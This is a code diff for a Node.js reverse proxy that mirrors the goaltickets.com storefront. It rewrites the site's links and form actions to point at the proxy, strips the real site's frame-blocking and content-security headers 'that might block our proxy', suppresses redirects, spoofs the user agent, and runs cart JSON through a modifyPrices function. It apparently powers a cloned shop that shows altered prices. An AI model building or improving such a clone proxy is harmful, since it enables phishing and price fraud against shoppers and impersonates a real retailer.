@@ -21,9 +21,10 @@ const axios = require('axios');
 const { URL } = require('url');
 
 const app = express();
+app.set('trust proxy', 1); // Enable trust proxy for rate limiting and other middleware
 const server = http.createServer(app);
 const PORT = process.env.PORT || 3000;
-const VERSION = '8.0.8'; // FIX: multiplier error, cart sections, fonts.shopifycdn.com CORS
+const VERSION = '8.0.9'; // COMPREHENSIVE FIX: complete URL rewriting, redirect handling, error fixes
 
 // Configuration
 const config = {
@@ -209,9 +210,36 @@ function rewriteHtml(html, baseUrl) {
       $(el).attr('href', href.replace('https://fonts.shopifycdn.com', '/fonts.shopifycdn.com'));
     });
     
-    $('link[href*="fonts.shopifycdn.com"]').each((i, el) => {
+    // Rewrite preload links
+    $('link[rel="preload"][href*="goaltickets.com"]').each((i, el) => {
       const href = $(el).attr('href');
-      $(el).attr('href', href.replace('https://fonts.shopifycdn.com', '/fonts.shopifycdn.com'));
+      if (href.includes('/cdn/')) {
+        $(el).attr('href', href.replace('https://goaltickets.com', ''));
+      }
+    });
+    
+    // Rewrite modulepreload links
+    $('link[rel="modulepreload"][href*="goaltickets.com"]').each((i, el) => {
+      const href = $(el).attr('href');
+      if (href.includes('/cdn/')) {
+        $(el).attr('href', href.replace('https://goaltickets.com', ''));
+      }
+    });
+    
+    // Rewrite all remaining goaltickets.com URLs in any attribute
+    $('*[href*="goaltickets.com"], *[src*="goaltickets.com"], *[action*="goaltickets.com"]').each((i, el) => {
+      const $el = $(el);
+      ['href', 'src', 'action'].forEach(attr => {
+        const value = $el.attr(attr);
+        if (value && value.includes('goaltickets.com')) {
+          if (value.includes('/cdn/')) {
+            $el.attr(attr, value.replace('https://goaltickets.com', ''));
+          } else {
+            const url = new URL(value);
+            $el.attr(attr, url.pathname + url.search + url.hash);
+          }
+        }
+      });
     });
   
   // Rewrite meta tags
@@ -477,6 +505,11 @@ const proxyOptions = {
   },
   
   onProxyRes: (proxyRes, req, res) => {
+    // Prevent ERR_HTTP_HEADERS_SENT by checking if headers are already sent
+    if (res.headersSent) {
+      return;
+    }
+    
     // Remove security headers that might block our proxy
     delete proxyRes.headers['x-frame-options'];
     delete proxyRes.headers['content-security-policy'];
@@ -875,6 +908,7 @@ app.get('/cart', (req, res, next) => {
       changeOrigin: true,
       secure: true,
       timeout: 15000,
+      selfHandleResponse: true, // CRITICAL: Handle response manually
       onProxyReq: (proxyReq, req, res) => {
         proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
         proxyReq.setHeader('Accept', 'application/json, text/html, */*');
@@ -887,6 +921,9 @@ app.get('/cart', (req, res, next) => {
         delete proxyRes.headers['access-control-allow-methods'];
         delete proxyRes.headers['access-control-allow-headers'];
         
+        // CRITICAL: Remove Location header to prevent redirect
+        delete proxyRes.headers['location'];
+        
         // Add our CORS headers
         proxyRes.headers['Access-Control-Allow-Origin'] = '*';
         proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
@@ -898,6 +935,28 @@ app.get('/cart', (req, res, next) => {
         proxyRes.headers['Content-Type'] = 'application/json; charset=utf-8';
         
         console.log('🛒 Cart sections response:', proxyRes.headers['content-type']);
+        
+        // Buffer and modify response
+        let body = Buffer.from('');
+        proxyRes.on('data', (chunk) => {
+          body = Buffer.concat([body, chunk]);
+        });
+        
+        proxyRes.on('end', () => {
+          try {
+            // Parse JSON and modify prices
+            const jsonData = JSON.parse(body.toString());
+            const modifiedData = modifyPrices(JSON.stringify(jsonData), 'application/json');
+            
+            // Send modified response
+            res.writeHead(proxyRes.statusCode, proxyRes.headers);
+            res.end(modifiedData);
+          } catch (e) {
+            console.error('❌ Cart sections JSON error:', e);
+            res.writeHead(proxyRes.statusCode, proxyRes.headers);
+            res.end(body);
+          }
+        });
       }
     });
     sectionsProxy(req, res);
